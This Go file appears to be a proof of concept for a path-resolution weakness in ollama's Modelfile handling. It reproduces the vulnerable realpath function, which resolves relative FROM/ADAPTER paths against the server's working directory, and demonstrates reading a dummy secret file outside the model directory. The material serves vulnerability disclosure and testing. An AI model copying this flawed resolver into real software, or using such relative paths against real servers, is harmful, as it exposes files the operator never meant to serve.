// PoC p07-漏洞版：ollama server/images.go 的 realpath 相对路径解析基准。
//
// 复现方式：下方的 realpath 段直接从 vulnerable-images.go（2eaa95b4）按函数
// 边界抽取，字节一致；外层 main 模拟 CreateModel 里 os.Open(realpath(c.Args))
// 的调用方式。漏洞版的 realpath 只有 filepath.Abs —— 相对路径按**进程 CWD**
// 解析，与 Modelfile 所在目录无关。
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func main() {
	base, err := os.MkdirTemp("", "poc07-")
	if err != nil {
		panic(err)
	}
	defer os.RemoveAll(base)

	serverCwd := filepath.Join(base, "server-cwd") // 服务进程启动目录（攻击者不可控）
	modelDir := filepath.Join(base, "models")      // Modelfile 所在目录（每个模型一个）
	if err := os.MkdirAll(serverCwd, 0o755); err != nil {
		panic(err)
	}
	if err := os.MkdirAll(modelDir, 0o755); err != nil {
		panic(err)
	}

	// 演示用“敏感文件”：只存在于服务 CWD 下，不在模型目录里
	secret := filepath.Join(serverCwd, "secret.txt")
	if err := os.WriteFile(secret, []byte("SECRET-OUTSIDE-MODEL-DIR"), 0o644); err != nil {
		panic(err)
	}
	if err := os.Chdir(serverCwd); err != nil { // 模拟服务从该目录启动
		panic(err)
	}

	arg := "secret.txt" // 攻击者 Modelfile 里的 FROM/ADAPTER 参数（相对路径）
	resolved := realpath(arg)
	data, readErr := os.ReadFile(resolved)

	fmt.Printf("服务 CWD         : %s\n", serverCwd)
	fmt.Printf("Modelfile 所在目录: %s\n", modelDir)
	fmt.Printf("Modelfile 参数    : %q\n", arg)
	fmt.Printf("realpath 解析     : %s\n", resolved)
	if readErr == nil {
		fmt.Printf("os.Open 读取成功，内容 = %q\n", strings.TrimSpace(string(data)))
		fmt.Println("判定: 相对路径越出 Modelfile 目录、按进程 CWD 解析并读取成功")
	} else {
		fmt.Printf("读取失败: %v\n", readErr)
	}
}
func realpath(p string) string {
	abspath, err := filepath.Abs(p)
	if err != nil {
		return p
	}

	home, err := os.UserHomeDir()
	if err != nil {
		return abspath
	}

	if p == "~" {
		return home
	} else if strings.HasPrefix(p, "~/") {
		return filepath.Join(home, p[2:])
	}

	return abspath
}
